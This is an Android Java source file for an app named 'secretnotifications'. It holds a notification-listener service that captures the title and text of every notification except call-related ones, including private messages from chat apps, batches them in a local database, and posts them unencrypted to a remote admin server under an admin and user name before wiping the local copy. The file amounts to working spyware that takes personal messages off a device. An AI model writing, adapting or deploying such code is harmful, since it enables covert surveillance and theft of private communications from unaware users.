package com.ctel_rtc.secretnotifications;

import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
//import android.support.v4.content.LocalBroadcastManager;
import android.widget.Toast;

//import net.gotev.uploadservice.MultipartUploadRequest;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.channels.FileChannel;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.TreeMap;
import java.util.UUID;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;


@TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
public class NotificationService extends NotificationListenerService {

    Context context;
    // public static final String UPLOAD_URL = "http://10.10.12.219/ImageUpload/uploadfile.php";
    public static final String UPLOAD_URL = "http://shopinfoapp.16mb.com/ImageUpload/uploadfile.php";

    @Override
    public void onCreate() {

        super.onCreate();
        context = getApplicationContext();

    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.e("notification", "came");
        String pack = sbn.getPackageName();
        Log.e("Package", pack);
       /* String ticker = sbn.getNotification().tickerText.toString();
        Log.e("Ticker",ticker);*/

        if (pack.contains("call")) {
        } else {// if (pack.contains("com.whatsapp"))
            //getForegroundApp();

            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString("android.title");
            // Log.e("Title", title);
            String text = "null";
            if (extras.getCharSequence("android.text") != null) {
                text = extras.getCharSequence("android.text").toString();
            }
            // Log.e("Text", text);

            UserDB userDB = new UserDB(context);
            SavedModel savedModel = new SavedModel();

            savedModel.setTitle(title);
            savedModel.setText(text);
            savedModel.setName("sravan");

      /*      // get phone user name
            Cursor c = getApplication().getContentResolver().query(ContactsContract.Profile.CONTENT_URI, null, null, null, null);
            c.moveToFirst();
            String username = c.getString(c.getColumnIndex("display_name"));
            c.close();*/

            userDB.insertRecord(savedModel);
            if (userDB.getList().size() > 10) {
                //  uploadfile(Environment.getExternalStorageDirectory() + "/backupname.db");

                //ExportDatabse("savedLocations");
                // exportDB();
                new sendNotifications().execute();

            }

            Intent msgrcv = new Intent("Msg");
            msgrcv.putExtra("package", pack);
            // msgrcv.putExtra("ticker", ticker);
            msgrcv.putExtra("title", title);
            msgrcv.putExtra("text", text);

         //   MainActivity.appendNotification(pack, title, text);

            Log.e("print", "print");
            //    LocalBroadcastManager.getInstance(context).sendBroadcast(msgrcv);
            Log.e("print", "print_end");
        }
    }

    @Override

    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.e("notificaion", "Notification Removed");

    }

    private class sendNotifications extends AsyncTask<String, Integer, String> {

        @Override
        protected String doInBackground(String... params) {
            // TODO Auto-generated method stub
            String str = postData();
            return str;
        }

        protected void onPostExecute(String json) {

            try {

                if (json.length() > 0) {

                    JSONObject jsonObjectMain;

                    try {

                        jsonObjectMain = new JSONObject(json);
                        String path = "";
                        Log.e("jsonObjectMain", "" + jsonObjectMain);

                        if (jsonObjectMain.has("error")) {

                            if (jsonObjectMain.getString("error").equalsIgnoreCase("false")) {


                            } else {
                            }
                        }


                    } catch (NullPointerException e) {
                        e.printStackTrace();
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                } else {

                }

            } catch (NullPointerException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        protected void onProgressUpdate(Integer... progress) {
        }

        @SuppressWarnings("deprecation")
        public String postData() {
            // Create a new HttpClient and Post Header
            HttpClient httpclient = new DefaultHttpClient();

           // HttpPost httppost = new HttpPost("http://10.10.12.112/Admin/public/putNotifications");
            HttpPost httppost = new HttpPost("http://ucsstech.in/Admin/public/putNotifications");

            String json = "";
            try {

                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

                JSONArray notificationsArray = new JSONArray();

                UserDB userDB = new UserDB(context);
                ArrayList<SavedModel> savedModelArrayList = new ArrayList<SavedModel>();
                savedModelArrayList = userDB.getList();
                for (int g = 0; g < savedModelArrayList.size(); g++) {

                    JSONObject object = new JSONObject();
                    Shared shared = new Shared(context);
                    try {
                        object.put("admin_name", "supraja");
                        object.put("user_name", shared.getUserName());
                        object.put("notification_title", savedModelArrayList.get(g).getTitle());
                        object.put("notification_body", savedModelArrayList.get(g).getText());

                        notificationsArray.put(object);

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }

                JSONObject obj = new JSONObject();
                try {
                    obj.put("notificationsArray", notificationsArray);
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                nameValuePairs.add(new BasicNameValuePair("notifications", obj.toString()));

                Log.v("nameValuePairs", nameValuePairs.toString());
                Log.v("notificationsArray", notificationsArray.toString());

                UserDB usdb = new UserDB(context);
                usdb.clearHomeTable();

                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                // Execute HTTP Post Request
                HttpResponse response = httpclient.execute(httppost);
                HttpEntity httpEntity = response.getEntity();
                InputStream is = httpEntity.getContent();

                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(is, "iso-8859-1"), 8);
                StringBuilder sb = new StringBuilder();
                String line = null;
                while ((line = reader.readLine()) != null) {
                    sb.append(line + "\n");
                }
                is.close();
                json = sb.toString();
                Log.v("objJsonMain", "" + json);

            } catch (ClientProtocolException e) {
                e.printStackTrace();
                // TODO Auto-generated catch block
            } catch (IOException e) {
                e.printStackTrace();
            }
            return json;
        }
    }


}